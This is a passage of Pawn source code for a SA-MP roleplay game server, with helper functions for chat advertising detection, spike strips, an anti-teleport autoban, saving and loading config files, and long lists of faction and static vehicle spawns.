    new strR[255], is1=0, r=0;
 	while(strlen(text[is1]))
 	{
  		if('0'<=text[is1]<='9')
  		{
	 		new is2=is1+1, p=0;
	   		while(p==0)
		  	{
		   		if('0'<=text[is2]<='9'&&strlen(text[is2]))
			   	{
				   is2++;
				}
			 	else
			  	{
				   	strmid(strR[r],text,is1,is2,255);
				   	if(strval(strR[r])<255) r++;
				    is1=is2;
				    p=1;
		    	}
		    }
	    }
    	is1++;
 	}
 	if(r>=4)
 	{
	  	new strMy[255];
	  	format(strMy, sizeof(strMy), "AdminWarning: %s is attempting to Server Advertise: %s", GetName(playerid), text);
	  	SendAdminMessage(COLOR_ADMWARN, strMy);
	   	new pr2;
	  	for(new z=0;z<r;z++)
	  	{

		   	while((pr2=strfind(text,strR[z],true))!=-1)
			{
				for(new i=pr2,j=pr2+strlen(strR[z]);i<j;i++)
				{
					text[i]='*';
				}
			}
	  	}
	  	return 1;
 	}
 	return 0;
}

stock IsAtFishingSWeed(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 2, 403.8016,-2088.7976,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 398.7358,-2088.7939,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 396.1771,-2088.7976,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 391.0683,-2088.7974,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 383.4282,-2088.7969,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 374.9623,-2088.7974,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 369.8990,-2088.7976,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 367.3003,-2088.7981,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 362.1855,-2088.7974,7.8359)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 354.5370,-2088.7983,7.8359)) return 1;
	return 0;
}


stock IsHoldingBullets(playerid)
{
	if(GetPlayerWeapon(playerid) < 22) return 0;
	if(GetPlayerWeapon(playerid) > 38) return 0;
	return 1;
}

stock SendGymMessage(color, string[])
{
	foreach(Player, playerid)
	{
		if(GetPlayerInterior(playerid) == 5 && GetPlayerVirtualWorld(playerid) == 1)
		{
		    SendClientMessage(playerid, color, string);
		}
	}
	return 1;
}

stock CreateStrip(Float:x,Float:y,Float:z,Float:Angle)
{
    for(new i = 0; i < sizeof(SpikeInfo); i++)
  	{
  	    if(SpikeInfo[i][sCreated] == 0)
  	    {
            SpikeInfo[i][sCreated]=1;
            SpikeInfo[i][sX]=x;
            SpikeInfo[i][sY]=y;
            SpikeInfo[i][sZ]=z-0.7;
            SpikeInfo[i][sObject] = CreateDynamicObject(2899, x, y, z-0.9, 0, 0, Angle-90);
	        return 1;
  	    }
  	}
  	return 0;
}

stock DeleteAllStrip()
{
    for(new i = 0; i < sizeof(SpikeInfo); i++)
  	{
  	    if(SpikeInfo[i][sCreated] == 1)
  	    {
  	        SpikeInfo[i][sCreated]=0;
            SpikeInfo[i][sX]=0.0;
            SpikeInfo[i][sY]=0.0;
            SpikeInfo[i][sZ]=0.0;
            DestroyDynamicObject(SpikeInfo[i][sObject]);
  	    }
	}
    return 1;
}

stock DeleteClosestStrip(playerid)
{
	new done, string[128];
    for(new i = 0; i < sizeof(SpikeInfo); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 2.0, SpikeInfo[i][sX], SpikeInfo[i][sY], SpikeInfo[i][sZ]))
        {
  	        if(SpikeInfo[i][sCreated] == 1)
            {
                SpikeInfo[i][sCreated]=0;
                SpikeInfo[i][sX]=0.0;
                SpikeInfo[i][sY]=0.0;
                SpikeInfo[i][sZ]=0.0;
                DestroyDynamicObject(SpikeInfo[i][sObject]);
                format(string, sizeof(string), "LSPD: %s has removed a spike strip.", GetName(playerid));
 				SendCopMessage(COLOR_BLUE, string);
 				done = 1;
  	        }
  	    }
  	}
  	if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a spike strip.");
    return 1;
}

encode_tires(tires1, tires2, tires3, tires4) {

	return tires1 | (tires2 << 1) | (tires3 << 2) | (tires4 << 3);

}

stock IsATowTruck(carid)
{
	if(GetVehicleModel(carid) == 485 || GetVehicleModel(carid) == 525 || GetVehicleModel(carid) == 583 || GetVehicleModel(carid) == 574)
	{
		return 1;
	}
	return 0;
}
stock GetNumberOfPlayersOnThisIP(test_ip[])
{
	new against_ip[32+1];
	new x = 0;
	new ip_count = 0;
	for(x=0; x<MAX_PLAYERS; x++) {
		if(IsPlayerConnected(x)) {
		    GetPlayerIp(x,against_ip,32);
		    if(!strcmp(against_ip,test_ip)) ip_count++;
		}
	}
	return ip_count;
}

stock AntiTPCheck(playerid)
{
	if(AntiTP[playerid])
	{
		if(!IsPlayerAnAdmin(playerid))
		{
    	    new string[128];
    		format(string, sizeof(string), "AdmCmd: %s has been autobanned, reason: Teleport Hacks", GetName(playerid));
            SendClientMessageToAll(COLOR_LIGHTRED, string);
            Log("Log/Admins/ban.log", string);
    		// Banreason
    		new file[32];
    		format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
    		dini_Set(file, "BanReason", "TP Hacks");
    		dini_Set(file, "BannedBy", "AutoBan");
    		Player[playerid][pBanned] = 1;
    		AddBan(playerid);
    		Kick(playerid);
    	}
	}
	return 1;
}
stock SaveMOTDS()
{
	new file[16];
	format(file, sizeof(file), "motds.cfg");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "Admin", ADMINMOTD);
	dini_Set(file, "Motd", SMOTD);
	dini_Set(file, "LSPD", LSPDMOTD);
	dini_Set(file, "GOV", GOVMOTD);
	dini_Set(file, "HA", HAMOTD);
	print("MOTDs saved successfully.");
}
stock LoadMOTDS()
{
	new file[16];
	format(file, sizeof(file), "motds.cfg");
	format(ADMINMOTD, 128, "%s", dini_Get(file, "Admin"));
	format(SMOTD, 128, "%s", dini_Get(file, "Motd"));
	format(LSPDMOTD, 128, "%s", dini_Get(file, "LSPD"));
	format(GOVMOTD, 128, "%s", dini_Get(file, "GOV"));
	format(HAMOTD, 128, "%s", dini_Get(file, "HA"));
	print("MOTDs loaded successfully.");
}
stock SaveTUpdates()
{
	new file[16];
	format(file, sizeof(file), "TUpdates.cfg");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "UPDATE1", UPDATE1);
	dini_Set(file, "UPDATE2", UPDATE2);
	dini_Set(file, "UPDATE3", UPDATE3);
	dini_Set(file, "UPDATE4", UPDATE4);
	dini_Set(file, "UPDATE5", UPDATE5);
	print("TUpdates saved successfully.");
}
stock LoadTUpdates()
{
	new file[16];
	format(file, sizeof(file), "TUpdates.cfg");
	format(UPDATE1, 128, "%s", dini_Get(file, "UPDATE1"));
	format(UPDATE2, 128, "%s", dini_Get(file, "UPDATE2"));
	format(UPDATE3, 128, "%s", dini_Get(file, "UPDATE3"));
	format(UPDATE4, 128, "%s", dini_Get(file, "UPDATE4"));
	format(UPDATE5, 128, "%s", dini_Get(file, "UPDATE5"));
	print("TUpdates loaded successfully.");
}
stock LoadDrugs()
{
	new file[32];
	format(file, sizeof(file), "drugs.cfg");
	if(!dini_Exists(file)) dini_Create(file);
	Seed = dini_Int(file, "Seed");
	cocaine = dini_Int(file, "cocaine");
	print("Drugs loaded successfully.");
	return 1;
}
stock SaveDrugs()
{
	new file[32];
	format(file, sizeof(file), "drugs.cfg");
	if(!dini_Exists(file)) dini_Create(file);
	dini_IntSet(file, "Seed", Seed);
	dini_IntSet(file, "cocaine", cocaine);
	print("Drugs saved successfully.");
	return 1;
}

stock LoadProducts()
{
	new file[32];
	format(file, sizeof(file), "products.cfg");
	if(!dini_Exists(file)) dini_Create(file);
	Products = dini_Int(file, "Products");
	print("Products loaded successfully.");
	return 1;
}
stock SaveProducts()
{
	new file[32];
	format(file, sizeof(file), "products.cfg");
	if(!dini_Exists(file)) dini_Create(file);
	dini_IntSet(file, "Products", Products);
	print("Products saved successfully.");
	return 1;
}

stock LoadStaticVehicles()
{

    // DMV Vehicles
	DMVCar[0] = CreateVehicle(404,2052.8206,-1903.9745,13.3249,359.6511-180,182,1,300); // Car1
    DMVCar[1] =	CreateVehicle(404,2056.1641,-1903.9946,13.3470,359.6512-180,182,1,300); // Car2
	DMVCar[2] = CreateVehicle(404,2059.3220,-1904.0138,13.3470,359.6512-180,182,1,300); // Car3
	DMVCar[3] = CreateVehicle(404,2062.5098,-1904.0331,13.3470,359.6512-180,182,1,300); // Car4
	DMVCar[4] = CreateVehicle(404,2065.6597,-1904.0526,13.3470,359.6512-180,182,1,300); // Car5
	//Darren vehicles
	CreateVehicle(513,-3288.9067000,2157.7859000,8.7544000,91.0000000,-1,-1,15); //Stunt
	CreateVehicle(513,-3288.6580000,2146.9817000,8.7544000,91.0000000,-1,-1,15); //Stunt
	CreateVehicle(539,-3334.8872000,2176.0352000,4.4510000,0.0000000,-1,-1,15); //Vortex
	CreateVehicle(539,-3338.3057000,2176.2542000,4.4510000,0.0000000,-1,-1,15); //Vortex
	CreateVehicle(539,-3341.7947000,2175.9741000,4.4510000,0.0000000,-1,-1,15); //Vortex
	CreateVehicle(539,-3346.3196000,2175.7500000,4.4510000,0.0000000,-1,-1,15); //Vortex
	CreateVehicle(539,-3350.4163000,2175.4670000,4.4510000,0.0000000,-1,-1,15); //Vortex
	CreateVehicle(539,-3354.1799000,2174.9822000,4.4510000,0.0000000,-1,-1,15); //Vortex
	CreateVehicle(513,-3288.8003000,2136.5781000,8.7544000,91.0000000,-1,-1,15); //Stunt
	// Police Vehicles
    FacInfo[1][fCars][0] = CreateVehicle(525, 1586.3896, -1679.3900, 5.7616, -90.0000, 1, 0, 1800); // Tow Truck
    FacInfo[1][fCars][1] = CreateVehicle(525, 1586.1378, -1675.9686, 5.7409, -91.0000, 1, 0, 1800); // Tow Truck
	FacInfo[1][fCars][2] = CreateVehicle(599, 1585.4824, -1671.6876, 6.0627, -90.0000, 0, 1, 1800); // Police Ranger
	FacInfo[1][fCars][3] = CreateVehicle(599, 1585.2313, -1667.6588, 5.9952, -89.0000, 0, 1, 1800); // Police Ranger
	FacInfo[1][fCars][4] = CreateVehicle(596, 1601.0680, -1683.9437, 5.5645, 91.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][5] = CreateVehicle(596, 1600.9785, -1687.9924, 5.6623, 91.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][6] = CreateVehicle(596, 1601.5355, -1691.9233, 5.5665, 90.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][7] = CreateVehicle(596, 1601.5017, -1696.0581, 5.5637, 91.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][8] = CreateVehicle(596, 1601.3464, -1700.0171, 5.5674, 90.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][9] = CreateVehicle(596, 1601.2556, -1704.2932, 5.5669, 90.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][10] = CreateVehicle(596, 1595.4810, -1710.8263, 5.5665, 0.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][11] = CreateVehicle(596, 1591.2904, -1710.9121, 5.5656, 0.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][12] = CreateVehicle(596, 1587.6676, -1710.6500, 5.7078, 0.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][13] = CreateVehicle(596, 1583.3821, -1710.8453, 5.5674, 0.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][14] = CreateVehicle(596, 1578.6084, -1710.9181, 5.5662, 0.0000, 0, 1, 1800); // LSPD Cruiser
	FacInfo[1][fCars][15] = CreateVehicle(402, 1574.4929, -1711.3218, 5.4688, 0.0000, 0, 1, 1800); // Buffalo
	FacInfo[1][fCars][16] = CreateVehicle(402, 1570.4352, -1711.2765, 5.6575, 0.0000, 0, 0, 1800); // Buffalo
	FacInfo[1][fCars][17] = CreateVehicle(402, 1566.3062, -1711.4326, 5.4698, 0.0000, 0, 0, 1800); // Buffalo
	FacInfo[1][fCars][18] = CreateVehicle(402, 1562.8416, -1711.5161, 5.4698, 0.0000, 0, 0, 1800); // Buffalo
	FacInfo[1][fCars][19] = CreateVehicle(402, 1558.8611, -1711.3173, 5.5692, 0.0000, 0, 0, 1800); // Buffalo
	FacInfo[1][fCars][20] = CreateVehicle(523, 1531.3784, -1688.1073, 5.3732, -94.0000, 0, 1, 1800); // Police Bike
	FacInfo[1][fCars][21] = CreateVehicle(523, 1528.9144, -1688.9773, 5.3732, -94.0000, 0, 1, 1800); // Police Bike
	FacInfo[1][fCars][22] = CreateVehicle(523, 1528.6887, -1686.8275, 5.3732, -94.0000, 0, 1, 1800); // Police Bike
	FacInfo[1][fCars][23] = CreateVehicle(523, 1531.2744, -1684.1848, 5.3732, -94.0000, 0, 1, 1800); // Police Bike
	FacInfo[1][fCars][24] = CreateVehicle(523, 1528.2012, -1685.1744, 5.3732, -94.0000, 0, 1, 1800); // Police Bike
	FacInfo[1][fCars][25] = CreateVehicle(523, 1528.4697, -1682.9102, 5.3732, -94.0000, 0, 1, 1800); // Police Bike
	FacInfo[1][fCars][26] = CreateVehicle(426, 1544.5616, -1687.9883, 5.5681, 89.0000, 0, 0, 1800); // Premier
	FacInfo[1][fCars][27] = CreateVehicle(426, 1544.4406, -1684.3126, 5.5681, 89.0000, 0, 0, 1800); // Premier
	FacInfo[1][fCars][28] = CreateVehicle(426, 1544.1853, -1680.3868, 5.5681, 89.0000, 0, 0, 1800); // Premier
	FacInfo[1][fCars][29] = CreateVehicle(489, 1544.7657, -1676.1276, 5.9602, 88.0000, 0, 0, 1800); //  Rancher
	FacInfo[1][fCars][30] = CreateVehicle(489, 1544.7738, -1672.2406, 5.9602, 88.0000, 0, 0, 1800); //  Rancher
	FacInfo[1][fCars][31] = CreateVehicle(489, 1544.7643, -1668.0687, 5.9602, 88.0000, 0, 0, 1800); //  Rancher
	FacInfo[1][fCars][32] = CreateVehicle(489, 1545.2892, -1663.1344, 5.9602, 88.0000, 0, 0, 1800); //  Rancher
	FacInfo[1][fCars][33] = CreateVehicle(528, 1544.5123, -1658.9335, 5.8617, 89.0000, -1, -1, 1800); // SAPD Armored Truck
	FacInfo[1][fCars][34] = CreateVehicle(528, 1544.5331, -1654.9633, 5.8617, 89.0000, -1, -1, 1800); // SAPD Armored Truck
	FacInfo[1][fCars][35] = CreateVehicle(528, 1545.1328, -1651.4049, 5.8617, 89.0000, -1, -1, 1800); // SAPD Armored Truck
	FacInfo[1][fCars][36] = CreateVehicle(601, 1538.6263, -1645.3348, 5.5653, -180.0000, -1, -1, 1800); // Water Truck
	FacInfo[1][fCars][37] = CreateVehicle(601, 1534.6100, -1645.2830, 5.5653, -180.0000, -1, -1, 1800); // Water Truck
	FacInfo[1][fCars][38] = CreateVehicle(427, 1530.4119, -1645.6797, 5.8653, -181.0000, 0, 1, 1800); // LSPD Enforcer
	FacInfo[1][fCars][39] = CreateVehicle(427, 1526.5964, -1645.6837, 5.8653, -181.0000, 0, 1, 1800); // LSPD Enforcer
	FacInfo[1][fCars][40] = CreateVehicle(497, 1550.9069, -1644.2263, 28.5585, 90.0000, 0, 1, 1800); // Police Maverick Helicopter
	FacInfo[1][fCars][41] = CreateVehicle(497, 1567.1461, -1644.1619, 28.4605, 90.0000, 0, 1, 1800); // Police Maverick Helicopter
	FacInfo[1][fCars][42] = CreateVehicle(497, 1549.7670, -1707.0520, 28.4605, 90.0000, 0, 1, 1800); // Police Maverick Helicopter
	FacInfo[1][fCars][43] = CreateVehicle(497, 1569.4139, -1707.2180, 28.4605, 90.0000, 0, 1, 1800); // Police Maverick Helicopter
	// Trucker Vehicles
	JobInfo[JOB_TRUCKER][jCars][0] = CreateVehicle(498,-42.7362,-1156.3251,1.1461,63.0969,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][1] = CreateVehicle(498,-40.0158,-1151.3914,1.1488,61.1992,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][2] = CreateVehicle(498,-37.0067,-1146.3475,1.1469,59.3490,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][3] = CreateVehicle(498,-59.5637,-1130.4662,1.1494,69.7219,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][4] = CreateVehicle(498,-51.3613,-1133.6899,1.1428,68.4873,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][5] = CreateVehicle(498,-43.6869,-1136.6785,1.1476,69.4767,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][6] = CreateVehicle(498,-76.8002,-1104.9545,1.1471,159.5948,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][7] = CreateVehicle(498,-72.3289,-1106.2477,1.1447,160.2594,1,1,1800); //
	JobInfo[JOB_TRUCKER][jCars][8] = CreateVehicle(498,-62.5046,-1147.8859,1.1456,244.0659,1,1,1800);
    JobInfo[JOB_TRUCKER][jTrailers][0] = CreateVehicle(591,586.4212,1642.6548,7.5887,64.7069,1,1,1800); // Trailer1
	JobInfo[JOB_TRUCKER][jTrailers][1] = CreateVehicle(591,590.1194,1646.2021,7.5983,64.9171,1,1,1800); // Trailer2
	JobInfo[JOB_TRUCKER][jTrailers][2] = CreateVehicle(591,595.2358,1649.7806,7.5984,63.1719,1,1,1800); // Trailer3
	JobInfo[JOB_TRUCKER][jTrailers][3] = CreateVehicle(591,600.3036,1652.1022,7.5980,64.5086,1,1,1800); // Trailer4
	JobInfo[JOB_TRUCKER][jTrailers][4] = CreateVehicle(591,605.3943,1655.4187,7.5983,65.3102,1,1,1800); // Trailer5
	JobInfo[JOB_TRUCKER][jTrailers][5] = CreateVehicle(591,610.1300,1658.3214,7.5985,65.3317,1,1,1800); // Trailer6
	JobInfo[JOB_TRUCKER][jTrailers][6] = CreateVehicle(591,615.0781,1661.2775,7.5986,65.0276,1,1,1800); // Trailer7
	// SA News Vehicles
	FacInfo[4][fCars][0] = CreateVehicle(582,770.3323,-1334.0879,13.5999,178.7927,1,6,1200); // News1
	FacInfo[4][fCars][1] = CreateVehicle(582,765.2671,-1333.9707,13.6022,178.8279,1,6,1200); // News2
	FacInfo[4][fCars][2] = CreateVehicle(582,760.0087,-1333.8882,13.5979,178.7898,1,6,1200); // News3
	FacInfo[4][fCars][3] = CreateVehicle(582,754.6099,-1333.7980,13.5991,180.2735,1,6,1200); // News4
	FacInfo[4][fCars][4] = CreateVehicle(582,749.0009,-1333.7161,13.5978,180.0546,1,6,1200); // News5
	FacInfo[4][fCars][5] = CreateVehicle(582,743.3420,-1333.6884,13.5983,180.0397,1,6,1200); // News6
	FacInfo[4][fCars][6] = CreateVehicle(488,743.7799,-1365.5004,25.8675,270.3967,1,6,1200); // News7
	FacInfo[4][fCars][7] = CreateVehicle(488,736.9495,-1376.4574,25.8464,182.8519,1,6,1200); // News8
	// LSFMD Vehicles
	FacInfo[5][fCars][0] = CreateVehicle(416,1177.8843,-1339.4053,14.0958,271.3541,3,1,1800); // LSFMD
	FacInfo[5][fCars][1] = CreateVehicle(489,1176.5439,-1308.6063,14.0301,269.7537,3,1,1800); // LSFMD
	FacInfo[5][fCars][2] = CreateVehicle(563,1161.1821,-1312.5316,32.1951,359.8618,3,1,1800); // LSFMD
	FacInfo[5][fCars][3] = CreateVehicle(416,1136.2651,-1295.8523,13.7342,178.5121,3,1,1800); // LSFMD
	FacInfo[5][fCars][4] = CreateVehicle(489,1141.6221,-1294.6012,13.6856,178.4503,3,1,1800); // LSFMD
	FacInfo[5][fCars][5] = CreateVehicle(416,1147.4626,-1295.7815,13.8318,179.8974,3,1,1800); // LSFMD
	FacInfo[5][fCars][6] = CreateVehicle(489,1143.5023,-1333.5992,13.7063,178.3253,3,1,1800); // LSFMD
	FacInfo[5][fCars][7] = CreateVehicle(416,1135.5206,-1341.4253,13.9326,179.5226,3,1,1800); // LSFMD
	FacInfo[5][fCars][8] = CreateVehicle(416,1131.1046,-1329.1996,13.8173,179.7918,3,1,1800); // LSFMD
	FacInfo[5][fCars][9] = CreateVehicle(407,1124.0211,-1329.8085,13.4106,358.7176,3,1,1800); // LSFMD
	FacInfo[5][fCars][10] = CreateVehicle(407,1110.5315,-1329.6898,13.4248,358.0090,3,1,1800); // LSFMD
	FacInfo[5][fCars][11] = CreateVehicle(544,1095.1245,-1328.4886,13.5225,359.3129,3,1,1800); // LSFMD
	FacInfo[5][fCars][12] = CreateVehicle(544,1100.4071,-1327.8572,13.5814,359.7810,3,1,1800); // LSFMD
	FacInfo[5][fCars][13] = CreateVehicle(544,1085.7761,-1336.6736,13.8789,180.8334,3,1,1800); // LSFMD
	FacInfo[5][fCars][14] = CreateVehicle(489,1086.1117,-1348.8544,13.7879,181.5884,3,1,1800); // LSFMD
	FacInfo[5][fCars][15] = CreateVehicle(416,1147.8430,-1348.0259,13.7980,180.6049,3,1,1800); // LSFMD
	FacInfo[5][fCars][16] = CreateVehicle(416,1147.7119,-1356.0168,13.8176,179.5193,3,1,1800); // LSFMD
	FacInfo[5][fCars][17] = CreateVehicle(416,1135.3391,-1307.9957,13.7339,179.0732,3,1,1800); // LSFMD
	FacInfo[5][fCars][18] = CreateVehicle(416,1147.4492,-1308.5249,13.8276,178.7850,3,1,1800); // LSFMD
	// FBI Vehicles
	FacInfo[6][fCars][0] = CreateVehicle(490,1769.4164,-1301.8170,13.8080,106.9446,0,0, 1800); // FBI
	FacInfo[6][fCars][1] = CreateVehicle(490,1770.1779,-1306.3177,13.8227,106.4003,0,0, 1800); // FBI
	FacInfo[6][fCars][2] = CreateVehicle(490,1743.8136,-1308.7778,13.7740,270.8757,0,0, 1800); // FBI
	FacInfo[6][fCars][3] = CreateVehicle(490,1743.6106,-1312.8771,13.7667,269.5936,0,0, 1800); // FBI
	FacInfo[6][fCars][4] = CreateVehicle(490,1753.9299,-1314.8728,13.7440,320.7125,0,0, 1800); // FBI
	FacInfo[6][fCars][5] = CreateVehicle(490,1758.9362,-1316.0698,13.7367,328.5540,0,0, 1800); // FBI
	FacInfo[6][fCars][6] = CreateVehicle(490,1759.1057,-1306.0813,13.7780,232.1078,0,0, 1800); // FBI
	FacInfo[6][fCars][7] = CreateVehicle(402,1763.6180,-1318.5919,13.4252,269.2573,0,0, 1800); // FBI
	FacInfo[6][fCars][8] = CreateVehicle(402,1775.4680,-1318.7987,13.4277,269.9104,0,0, 1800); // FBI
	FacInfo[6][fCars][9] = CreateVehicle(402,1785.8041,-1318.6449,13.4336,268.6157,0,0, 1800); // FBI
	FacInfo[6][fCars][10] = CreateVehicle(421,1812.6223,-1311.5765,13.5271,269.2274,0,0, 1800); // FBI
	FacInfo[6][fCars][11] = CreateVehicle(421,1805.0891,-1311.4989,13.5534,269.0432,0,0, 1800); // FBI
	FacInfo[6][fCars][12] = CreateVehicle(487,1822.6425,-1304.3365,131.8945,1.4403,0,0, 1800); // FBI
	FacInfo[6][fCars][13] = CreateVehicle(487,1822.0387,-1281.6670,131.9542,0.2192,0,0, 1800); // FBI
	// DOC Vehicles
	FacInfo[7][fCars][0] = CreateVehicle(470,837.9775,-2395.1943,13.0812,131.6646,55,125, 1800); // DOC
	FacInfo[7][fCars][1] = CreateVehicle(470,834.7910,-2391.4185,13.0900,133.6910,50,35, 1800); // DOC
	FacInfo[7][fCars][2] = CreateVehicle(470,831.7328,-2388.1150,13.0912,132.2966,125,123, 1800); // DOC

	// Static Vehicles
	CreateVehicle(518,2177.00000000,-1807.59997559,13.19999981,358.00000000,0,0,600); //Buccaneer
	CreateVehicle(526,2158.60009766,-1795.19995117,13.19999981,270.00000000,0,0,600); //Fortune
	CreateVehicle(410,2158.19995117,-1802.50000000,13.10000038,270.00000000,0,0,600); //Manana
	CreateVehicle(496,2169.19995117,-1808.00000000,13.19999981,358.00000000,0,0,600); //Blista Compact
	CreateVehicle(542,2180.19995117,-1715.40002441,13.39999962,0.00000000,0,0,600); //Clover
	CreateVehicle(527,2180.80004883,-1704.40002441,13.39999962,0.00000000,0,0,600); //Cadrona
	CreateVehicle(549,2279.19995117,-1683.30004883,14.69999981,0.00000000,0,0,600); //Tampa
	CreateVehicle(517,2283.80004883,-1683.50000000,14.00000000,0.00000000,0,0,600); //Majestic
	CreateVehicle(496,1929.30004883,-1795.69995117,13.19999981,266.00000000,0,-1,600); //Blista Compact
	CreateVehicle(466,1923.59997559,-1795.50000000,13.30000019,268.00000000,0,0,600); //Glendale
	CreateVehicle(468,1282.50000000,-1364.19995117,13.10000038,90.00000000,0,0,600); //Sanchez
	CreateVehicle(466,1607.19995117,-1651.50000000,13.50000000,90.00000000,0,0,600); //Glendale
	CreateVehicle(526,1361.00000000,-1643.40002441,13.19999981,270.00000000,0,0,600); //Fortune
	CreateVehicle(400,1012.79998779,-1368.50000000,13.50000000,0.00000000,0,0,600); //Landstalker
	CreateVehicle(421,200.19999695,-1440.40002441,13.10000038,318.00000000,0,0,600); //Washington
	CreateVehicle(421,214.29980469,-1425.39941406,13.30000019,313.99475098,0,0,600); //Washington
	CreateVehicle(400,1281.80004883,-1295.90002441,13.50000000,0.00000000,0,0,600); //Landstalker
    CreateVehicle(400,1277.90002441,-1295.69995117,13.50000000,0.00000000,0,0,600); //Landstalker
    CreateVehicle(475,1282.69995117,-1369.69995117,13.30000019,0.00000000,0,0,600); //Sabre
    CreateVehicle(496,1283.80004883,-1317.69995117,13.19999981,0.00000000,0,0,600); //Blista Compact
    CreateVehicle(496,1275.19995117,-1317.59997559,13.30000019,0.00000000,0,0,600); //Blista Compact
    CreateVehicle(428,1385.00000000,-1016.00000000,27.00000000,355.50000000,1,0,600); //Securicar
    CreateVehicle(496,1748.19995117,-1045.40002441,23.70000076,0.00000000,0,0,600); //Blista Compact
    CreateVehicle(496,1775.69995117,-1021.50000000,23.70000076,330.00000000,0,0,600); //Blista Compact
    CreateVehicle(463,2295.80004883,-1647.19995117,14.39999962,0.00000000,3,0,600); //Freeway
    CreateVehicle(463,2297.50000000,-1647.19995117,14.39999962,0.00000000,3,0,600); //Freeway
    CreateVehicle(463,2299.50000000,-1647.19995117,14.39999962,0.00000000,3,0,600); //Freeway
    CreateVehicle(463,2295.39990234,-1629.90002441,14.30000019,178.00000000,3,0,600); //Freeway
    CreateVehicle(463,2297.89990234,-1630.69995117,14.30000019,177.99499512,3,0,600); //Freeway
    CreateVehicle(463,2300.89990234,-1630.69995117,14.30000019,177.99499512,3,0,600); //Freeway
    CreateVehicle(517,1255.09997559,-803.90002441,84.09999847,0.00000000,11,1,600); //Majestic
    CreateVehicle(517,1248.30004883,-803.79998779,84.09999847,0.00000000,11,1,600); //Majestic
    CreateVehicle(542,2767.60009766,-1874.40002441,9.60000038,0.00000000,0,0,600); //f
    CreateVehicle(542,2748.10009766,-1874.30004883,9.60000038,0.00000000,0,0,600); //f
    CreateVehicle(495,452.39999390,-1810.00000000,6.09999990,0.00000000,0,0,600); //Sandking
    CreateVehicle(495,444.29998779,-1809.80004883,6.09999990,0.00000000,0,0,600); //Sandking
    CreateVehicle(466,2025.50000000,-1295.90002441,20.79999924,0.00000000,0,0,600); //Glendale
    CreateVehicle(466,2025.40002441,-1287.30004883,20.79999924,0.00000000,0,0,600); //Glendale
    CreateVehicle(475,2105.60009766,-1364.69995117,23.89999962,0.00000000,0,0,600); //Sabre
    CreateVehicle(579,2095.89990234,-1363.59997559,23.89999962,0.00000000,0,-1,600); //Huntley
    CreateVehicle(560,285.89999390,-1594.09997559,32.59999847,0.00000000,1,-1,600); //Sultan
    CreateVehicle(525, 2282.9084, -2351.3218, 13.4, 225.36, 1, 79, 600); // TowTruck Pos
	CreateVehicle(525, 2289.9924, -2344.1809, 13.4, 225.36, 1, 79, 600); // TowTruck Pos
	CreateVehicle(525, 2297.6077, -2336.4568, 13.4, 225.36, 1, 79, 600); // TowTruck Pos

	// VIP Vehicles
	VIPCar[0] = CreateVehicle(522,3128.7007,-1118.6184,8.1443,358.7187,29,92,1800); //
	VIPCar[1] = CreateVehicle(522,3125.5825,-1118.6611,8.1456,354.7894,120,36,1800); //
	VIPCar[2] = CreateVehicle(522,3122.1731,-1118.4602,8.1382,357.4416,94,22,1800); //
	VIPCar[3] = CreateVehicle(522,3122.5159,-1107.5286,8.1378,180.5882,98,102,1800); //
	VIPCar[4] = CreateVehicle(522,3125.4375,-1107.4061,8.1378,182.1188,44,95,1800); //
	VIPCar[5] = CreateVehicle(522,3129.0461,-1107.3773,8.1442,183.2659,27,40,1800); //
	VIPCar[6] = CreateVehicle(415,3119.4375,-1107.7438,8.3491,178.3269,8,125,1800); //
	VIPCar[7] = CreateVehicle(415,3116.0698,-1107.5464,8.3494,178.5144,88,102,1800); //
	VIPCar[8] = CreateVehicle(415,3119.3647,-1118.1134,8.3415,359.8200,30,47,1800); //
	VIPCar[9] = CreateVehicle(415,3116.0237,-1118.1218,8.3493,0.7862,63,0,1800); //
	VIPCar[10] = CreateVehicle(424,3112.8594,-1118.2828,8.3574,359.4449,115,88,1800); //
	VIPCar[11] = CreateVehicle(424,3112.9707,-1107.3846,8.3601,178.5276,68,20,1800); //
	VIPCar[12] = CreateVehicle(424,3109.6797,-1107.2256,8.3586,180.8364,13,95,1800); //
	VIPCar[13] = CreateVehicle(424,3109.5039,-1118.5170,8.3521,358.2842,111,105,1800); //
	VIPCar[14] = CreateVehicle(434,3106.6499,-1118.1084,8.5299,359.3521,55,78,1800); //
	VIPCar[15] = CreateVehicle(434,3103.3438,-1118.3323,8.5447,0.7685,120,116,1800); //
